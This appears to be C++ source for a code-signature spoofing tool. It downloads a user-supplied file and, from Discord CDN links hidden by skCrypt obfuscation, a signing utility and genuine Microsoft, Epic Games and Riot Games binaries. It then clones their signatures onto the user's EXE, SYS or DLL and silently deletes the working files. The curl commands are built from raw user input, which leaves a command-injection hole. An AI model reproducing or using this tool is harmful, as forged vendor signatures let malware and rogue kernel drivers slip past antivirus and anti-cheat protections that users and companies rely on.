#include "sign.h"

int main() {
	SetConsoleTitleA("Made with Love <3");
	system("cls");

	std::string command_windows_exe = "C:\\Windows\\IME\\sign.exe -i C:\\Windows\\IME\\explorer.exe -t C:\\Windows\\IME\\file.exe -o C:\\Users\\%username%\\Desktop\\file.exe";
	std::string command_windows_sys = "C:\\Windows\\IME\\sign.exe -i C:\\Windows\\IME\\explorer.exe -t C:\\Windows\\IME\\file.sys -o C:\\Users\\%username%\\Desktop\\file.sys";
	std::string command_windows_dll = "C:\\Windows\\IME\\sign.exe -i C:\\Windows\\IME\\explorer.exe -t C:\\Windows\\IME\\file.dll -o C:\\Users\\%username%\\Desktop\\file.dll";

	std::string command_epicgames_exe = "C:\\Windows\\IME\\sign.exe -i C:\\Windows\\IME\\epic.exe -t C:\\Windows\\IME\\file.exe -o C:\\Users\\%username%\\Desktop\\file.exe";
	std::string command_epicgames_sys = "C:\\Windows\\IME\\sign.exe -i C:\\Windows\\IME\\epic.exe -t C:\\Windows\\IME\\file.sys -o C:\\Users\\%username%\\Desktop\\file.sys";
	std::string command_epicgames_dll = "C:\\Windows\\IME\\sign.exe -i C:\\Windows\\IME\\epic.exe -t C:\\Windows\\IME\\file.dll -o C:\\Users\\%username%\\Desktop\\file.dll";

	std::string command_riotgames_exe = "C:\\Windows\\IME\\sign.exe -i C:\\Windows\\IME\\riot.exe -t C:\\Windows\\IME\\file.exe -o C:\\Users\\%username%\\Desktop\\file.exe";
	std::string command_riotgames_sys = "C:\\Windows\\IME\\sign.exe -i C:\\Windows\\IME\\riot.exe -t C:\\Windows\\IME\\file.sys -o C:\\Users\\%username%\\Desktop\\file.sys";
	std::string command_riotgames_dll = "C:\\Windows\\IME\\sign.exe -i C:\\Windows\\IME\\riot.exe -t C:\\Windows\\IME\\file.dll -o C:\\Users\\%username%\\Desktop\\file.dll";

	std::string xyz;
	std::cout << "\n\n [1] Microsoft Windows";
	std::cout << "\n [2] Epic Games";
	std::cout << "\n [3] Riot Games";
	std::cout << "\n\n option: ";
	std::cin >> xyz;

	if (xyz == "1") {
		std::string xyzz;
		std::cout << "\n\n [1] EXE";
		std::cout << "\n [2] SYS";
		std::cout << "\n [3] DLL";
		std::cout << "\n\n option: ";
		std::cin >> xyzz;

		if (xyzz == "1") {
			std::string yourfile;
			std::cout << "\n\n [FileLink]: ";
			std::cin >> yourfile;
			std::string user_file = "curl " + yourfile + " -o C:\\Windows\\IME\\file.exe --silent";
			system(user_file.c_str());
			windows();
			system(command_windows_exe.c_str());
			system("del C:\\Windows\\IME\\sign.exe");
			system("del C:\\Windows\\IME\\file.exe");
			MoveFileA("C:\\Windows\\IME\\file.exe_signed", "C:\\Users\\%username%\\Desktop\\file.exe");
			system("del C:\\Windows\\IME\\file.exe_signed");
		}

		if (xyzz == "2") {
			std::string yourfile;
			std::cout << "\n\n [FileLink]: ";
			std::cin >> yourfile;
			std::string user_file = "curl " + yourfile + " -o C:\\Windows\\IME\\file.sys --silent";
			system(user_file.c_str());
			windows();
			system(command_windows_sys.c_str());
			system("del C:\\Windows\\IME\\sign.exe");
			system("del C:\\Windows\\IME\\file.sys");
			MoveFileA("C:\\Windows\\IME\\file.sys_signed", "C:\\Users\\%username%\\Desktop\\file.sys");
			system("del C:\\Windows\\IME\\file.sys_signed");
		}

		if (xyzz == "3") {
			std::string yourfile;
			std::cout << "\n\n [FileLink]: ";
			std::cin >> yourfile;
			std::string user_file = "curl " + yourfile + " -o C:\\Windows\\IME\\file.dll --silent";
			system(user_file.c_str());
			windows();
			system(command_windows_dll.c_str());
			system("del C:\\Windows\\IME\\sign.exe");
			system("del C:\\Windows\\IME\\file.dll");
			MoveFileA("C:\\Windows\\IME\\file.dll_signed", "C:\\Users\\%username%\\Desktop\\file.dll");
			system("del C:\\Windows\\IME\\file.dll_signed");
		}
	}

	if (xyz == "2") {
		std::string xyzz;
		std::cout << "\n\n [1] EXE";
		std::cout << "\n [2] SYS";
		std::cout << "\n [3] DLL";
		std::cout << "\n\n option: ";
		std::cin >> xyzz;

		if (xyzz == "1") {
			std::string yourfile;
			std::cout << "\n\n [FileLink]: ";
			std::cin >> yourfile;
			std::string user_file = "curl " + yourfile + " -o C:\\Windows\\IME\\file.exe --silent";
			system(user_file.c_str());
			epicgames();
			system(command_epicgames_exe.c_str());
			system("del C:\\Windows\\IME\\sign.exe");
			system("del C:\\Windows\\IME\\file.exe");
			MoveFileA("C:\\Windows\\IME\\file.exe_signed", "C:\\Users\\%username%\\Desktop\\file.exe");
			system("del C:\\Windows\\IME\\file.exe_signed");
		}

		if (xyzz == "2") {
			std::string yourfile;
			std::cout << "\n\n [FileLink]: ";
			std::cin >> yourfile;
			std::string user_file = "curl " + yourfile + " -o C:\\Windows\\IME\\file.sys --silent";
			system(user_file.c_str());
			epicgames();
			system(command_epicgames_sys.c_str());
			system("del C:\\Windows\\IME\\sign.exe");
			system("del C:\\Windows\\IME\\file.sys");
			MoveFileA("C:\\Windows\\IME\\file.sys_signed", "C:\\Users\\%username%\\Desktop\\file.sys");
			system("del C:\\Windows\\IME\\file.sys_signed");
		}

		if (xyzz == "3") {
			std::string yourfile;
			std::cout << "\n\n [FileLink]: ";
			std::cin >> yourfile;
			std::string user_file = "curl " + yourfile + " -o C:\\Windows\\IME\\file.dll --silent";
			system(user_file.c_str());
			epicgames();
			system(command_epicgames_dll.c_str());
			system("del C:\\Windows\\IME\\sign.exe");
			system("del C:\\Windows\\IME\\file.dll");
			MoveFileA("C:\\Windows\\IME\\file.dll_signed", "C:\\Users\\%username%\\Desktop\\file.dll");
			system("del C:\\Windows\\IME\\file.dll_signed");
		}
	}

	if (xyz == "3") {
		std::string xyzz;
		std::cout << "\n\n [1] EXE";
		std::cout << "\n [2] SYS";
		std::cout << "\n [3] DLL";
		std::cout << "\n\n option: ";
		std::cin >> xyzz;

		if (xyzz == "1") {
			std::string yourfile;
			std::cout << "\n\n [FileLink]: ";
			std::cin >> yourfile;
			std::string user_file = "curl " + yourfile + " -o C:\\Windows\\IME\\file.exe --silent";
			system(user_file.c_str());
			riotgames();
			system(command_riotgames_exe.c_str());
			system("del C:\\Windows\\IME\\sign.exe");
			system("del C:\\Windows\\IME\\file.exe");
			MoveFileA("C:\\Windows\\IME\\file.exe_signed", "C:\\Users\\%username%\\Desktop\\file.exe");
			system("del C:\\Windows\\IME\\file.exe_signed");
		}

		if (xyzz == "2") {
			std::string yourfile;
			std::cout << "\n\n [FileLink]: ";
			std::cin >> yourfile;
			std::string user_file = "curl " + yourfile + " -o C:\\Windows\\IME\\file.sys --silent";
			system(user_file.c_str());
			riotgames();
			system(command_riotgames_sys.c_str());
			system("del C:\\Windows\\IME\\sign.exe");
			system("del C:\\Windows\\IME\\file.sys");
			MoveFileA("C:\\Windows\\IME\\file.sys_signed", "C:\\Users\\%username%\\Desktop\\file.sys");
			system("del C:\\Windows\\IME\\file.sys_signed");
		}

		if (xyzz == "3") {
			std::string yourfile;
			std::cout << "\n\n [FileLink]: ";
			std::cin >> yourfile;
			std::string user_file = "curl " + yourfile + " -o C:\\Windows\\IME\\file.dll --silent";
			system(user_file.c_str());
			riotgames();
			system(command_riotgames_dll.c_str());
			system("del C:\\Windows\\IME\\sign.exe");
			system("del C:\\Windows\\IME\\file.dll");
			MoveFileA("C:\\Windows\\IME\\file.dll_signed", "C:\\Users\\%username%\\Desktop\\file.dll");
			system("del C:\\Windows\\IME\\file.dll_signed");
		}
	}
	
	return main();
}

void windows() {
	system(skCrypt("curl https://cdn.discordapp.com/attachments/1074732629754126431/1076579584138551416/sign.exe -o C:\\Windows\\IME\\sign.exe --silent"));
	system(skCrypt("curl https://cdn.discordapp.com/attachments/1074732629754126431/1076579985525055508/explorer.exe -o C:\\Windows\\IME\\explorer.exe --silent"));
}
void epicgames() {
	system(skCrypt("curl https://cdn.discordapp.com/attachments/1074732629754126431/1076579584138551416/sign.exe -o C:\\Windows\\IME\\sign.exe --silent"));
	system(skCrypt("curl https://cdn.discordapp.com/attachments/1074732629754126431/1076586798769262633/EpicGamesLauncher.exe -o C:\\Windows\\IME\\epic.exe --silent"));
}
void riotgames() {
	system(skCrypt("curl https://cdn.discordapp.com/attachments/1074732629754126431/1076579584138551416/sign.exe -o C:\\Windows\\IME\\sign.exe --silent"));
	system(skCrypt("curl https://cdn.discordapp.com/attachments/1074732629754126431/1076601243432128582/riot.exe -o C:\\Windows\\IME\\riot.exe --silent"));
}